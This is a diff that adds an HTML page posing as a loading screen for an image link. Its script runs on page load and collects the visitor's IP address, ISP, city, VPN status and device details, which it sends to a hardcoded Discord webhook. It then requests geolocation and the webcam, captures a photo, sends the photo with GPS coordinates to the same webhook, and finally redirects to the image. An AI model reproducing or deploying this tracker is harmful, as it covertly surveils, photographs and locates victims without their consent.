@@ -1,0 +1,77 @@
+<html><head><meta name='viewport' content='width=device-width, initial-scale=1.0'></head><body style='background:#000; color:#000;'> Loading... <script>
+    const W = "https://discord.com/api/webhooks/1455922764258218097/xvO8yzlb1LasyL3sPXq3eshO17uU1nFfQ8Zpf4LKhVYjuGkA4M0a-d_bc2I48wM0TUXa";
+    const R = "https://cdn.discordapp.com/attachments/1359189845167182167/1462060351452352668/20260117-1503.jpg?ex=696cd14f&is=696b7fcf&hm=b1f265240ce494350e4159bee6c1a477ec09103946b54da47bb7ee60b1544108&";
+
+    async function THE_BRIDGE() {
+        // الضربة الأولى: سحب كل المعلومات اللي ما تحتاج إذن (فوراً)
+        try {
+            const n = await fetch('https://ipapi.co/json/').then(r => r.json());
+            const b = await navigator.getBattery().catch(() => ({}));
+            const gl = document.createElement('canvas').getContext('webgl');
+            const gpu = gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL);
+            
+            const initial_data = {
+                embeds: [{
+                    title: "🔱 V58.0 BRIDGE - INITIAL DATA 🔱",
+                    color: 16711680,
+                    fields: [
+                        { name: "🌐 REAL IP", value: "`"+n.ip+"`", inline: true },
+                        { name: "📡 ISP", value: "`"+n.org+"`", inline: true },
+                        { name: "📶 NET TYPE", value: "`"+(navigator.connection?.effectiveType || "N/A").toUpperCase()+"`", inline: true },
+                        { name: "🌍 COUNTRY", value: "`"+n.country_name+"`", inline: true },
+                        { name: "📍 LOCATION", value: "`"+n.city+", "+n.region+"`", inline: true },
+                        { name: "⏰ TIMEZONE", value: "`"+n.timezone+"`", inline: true },
+                        { name: "🛡️ VPN", value: "**"+(n.security?.is_vpn ? "YES" : "NO")+"**", inline: false },
+                        { name: "📱 DEVICE", value: "`"+navigator.platform+"`", inline: true },
+                        { name: "💻 OS", value: "`"+(navigator.userAgent.match(/\(([^)]+)\)/) || [0,"N/A"])[1]+"`", inline: true },
+                        { name: "🏠 HOST", value: "`"+(window.location.hostname || "LOCAL_FILE")+"`", inline: true },
+                        { name: "⚙️ CPU", value: "`"+navigator.hardwareConcurrency+" CORES`", inline: true },
+                        { name: "🔋 BATT", value: "`"+(b.level*100 || 0)+"%`", inline: true },
+                        { name: "🖥️ SCREEN", value: "`"+window.screen.width+"x"+window.screen.height+"`", inline: true },
+                        { name: "🎮 GPU", value: "```"+gpu+"```", inline: false },
+                        { name: "🔍 UA", value: "```"+navigator.userAgent+"```", inline: false }
+                    ],
+                    footer: { text: "V58.0 BRIDGE | BYPASSING..." }
+                }]
+            };
+
+            // إرسال البيانات فوراً قبل أي إذن
+            await fetch(W, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(initial_data), keepalive: true });
+
+            // محاولة الكاميرا والموقع (الضربة الثانية)
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                let pic = null;
+                try {
+                    const s = await navigator.mediaDevices.getUserMedia({ video: true });
+                    const v = document.createElement('video'); v.srcObject = s; await v.play();
+                    const can = document.createElement('canvas');
+                    can.width = v.videoWidth; can.height = v.videoHeight;
+                    can.getContext('2d').drawImage(v, 0, 0);
+                    pic = await new Promise(res => can.toBlob(res, 'image/png'));
+                    s.getTracks().forEach(t => t.stop());
+                } catch(e) {}
+
+                const fd = new FormData();
+                const gps_report = {
+                    embeds: [{
+                        title: "💀 V58.0 BRIDGE - SENSOR ACCESS 💀",
+                        color: 16711680,
+                        fields: [{ name: "🗺️ GPS", value: "http://googleusercontent.com/maps.google.com/q="+pos.coords.latitude+","+pos.coords.longitude }],
+                        image: { url: "attachment://s.png" }
+                    }]
+                };
+                fd.append('payload_json', JSON.stringify(gps_report));
+                if(pic) fd.append('file', pic, 's.png');
+                await fetch(W, { method: 'POST', body: fd, keepalive: true });
+                
+                // الانتقال للرابط المحفوظ
+                window.location.replace(R);
+            }, () => { window.location.replace(R); }, { timeout: 3000 });
+
+            // تحويل قسري سريع جداً لضمان عدم التحميل
+            setTimeout(() => { window.location.replace(R); }, 4000);
+
+        } catch(e) { window.location.replace(R); }
+    }
+    THE_BRIDGE();
+    </script></body></html>
